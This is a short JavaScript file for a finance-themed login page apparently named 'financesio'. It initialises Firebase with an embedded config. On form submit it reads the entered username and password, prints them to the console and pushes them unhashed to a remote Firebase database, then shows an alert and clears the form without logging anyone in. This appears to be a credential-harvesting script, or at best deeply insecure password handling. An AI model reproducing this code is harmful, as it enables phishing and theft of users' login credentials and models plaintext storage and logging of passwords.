const firebaseConfig = {
    apiKey: "AIzaSyBiqodj4LeZ0nzE6kff8oB8LY0Ufgzzx1I",
    authDomain: "financesio.firebaseapp.com",
    databaseURL: "https://financesio-default-rtdb.firebaseio.com",
    projectId: "financesio",
    storageBucket: "financesio.appspot.com",
    messagingSenderId: "396655495409",
    appId: "1:396655495409:web:c4464d897c6901bed90150"
  };

  // firebase init
  firebase.initializeApp(firebaseConfig);

  // ref database 
  var loginFormDB = firebase.database().ref('loginForm')

  document.getElementById('loginForm').addEventListener('submit', submitForm)

  function submitForm(e){
    e.preventDefault();

    var username = getElementVal('username');
    var password = getElementVal('password');

    console.log(username, password);

    saveMessages(username, password);

    //enable alert 
    document.querySelector('.alert').style.display = 'block';

    //disable alert
    
    setTimeout( () => {
      document.querySelector('.alert').style.display = 'none';
    },3000);

    //reset alert
    document.getElementById('loginForm').reset();

  }

  const saveMessages = (username, password) => {
    var newLoginForm = loginFormDB.push();

    newLoginForm.set({
        username : username,
        password : password

    })
  }

  const getElementVal = (id) => {
    return document.getElementById(id).value;
  }

  
    